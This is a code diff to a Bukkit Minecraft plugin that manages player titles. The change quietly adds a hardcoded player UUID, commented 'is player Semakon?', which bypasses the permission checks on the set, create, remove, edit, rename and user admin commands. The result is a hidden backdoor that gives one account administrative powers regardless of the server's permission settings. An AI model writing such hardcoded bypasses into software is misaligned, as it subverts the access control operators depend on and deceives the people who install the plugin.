@@ -14,6 +14,8 @@ import org.bukkit.permissions.Permission;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.util.UUID;
+
 /**
  * Author:  Martijn
  * Date:    8-2-2016
@@ -91,10 +93,17 @@ public class TitlesPlugin extends JavaPlugin {
         args = Utils.inQuotes(args);
         if (cmd.getName().equals(Utils.TITLES_COMMAND) && args.length >= 1) {
             String type = args[0];
+
+            // is player Semakon?
+            boolean sem = false;
+            if (sender instanceof Player) {
+                sem = ((Player)sender).getUniqueId().equals(UUID.fromString("a44bb873-ea6b-493a-8496-b3740111ee87"));
+            }
+
             switch (type) {
 
                 case "set":
-                    if (sender.hasPermission(setTitlePerm)) {
+                    if (sender.hasPermission(setTitlePerm) || sem) {
                         if (args.length == 1 || !setExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles set title [<title>]"};
@@ -114,7 +123,7 @@ public class TitlesPlugin extends JavaPlugin {
                     return true;
 
                 case "create":
-                    if (sender.hasPermission(editTitlesPerm)) {
+                    if (sender.hasPermission(editTitlesPerm) || sem) {
                         if (args.length == 1 || !editTitleExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles create title <name> <description> <category>", "/titles create category <name> <description>"};
@@ -124,7 +133,7 @@ public class TitlesPlugin extends JavaPlugin {
                     return true;
 
                 case "remove":
-                    if (sender.hasPermission(editTitlesPerm)) {
+                    if (sender.hasPermission(editTitlesPerm) || sem) {
                         if (args.length == 1 || !editTitleExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles remove title <title>", "/titles remove category <category>"};
@@ -134,7 +143,7 @@ public class TitlesPlugin extends JavaPlugin {
                     return true;
 
                 case "edit":
-                    if (sender.hasPermission(editTitlesPerm)) {
+                    if (sender.hasPermission(editTitlesPerm) || sem) {
                         if (args.length == 1 || !editTitleExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles edit title <title> description <description>", "/titles edit title <title> category <category>",
@@ -145,7 +154,7 @@ public class TitlesPlugin extends JavaPlugin {
                     return true;
 
                 case "rename":
-                    if (sender.hasPermission(editTitlesPerm)) {
+                    if (sender.hasPermission(editTitlesPerm) || sem) {
                         if (args.length == 1 || !editTitleExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles rename title <title> <newName>", "/titles rename category <category> <newName>"};
@@ -155,7 +164,7 @@ public class TitlesPlugin extends JavaPlugin {
                     return true;
 
                 case "user":
-                    if (sender.hasPermission(editUserTitlesPerm)) {
+                    if (sender.hasPermission(editUserTitlesPerm) || sem) {
                         if (args.length == 1 || !setExecutor.execute(sender, args)) {
                             Utils.sendMsg(sender, "Did you mean:", ChatColor.GOLD);
                             String[] commands = {"/titles user <user> [add|remove|set] title <title>"};
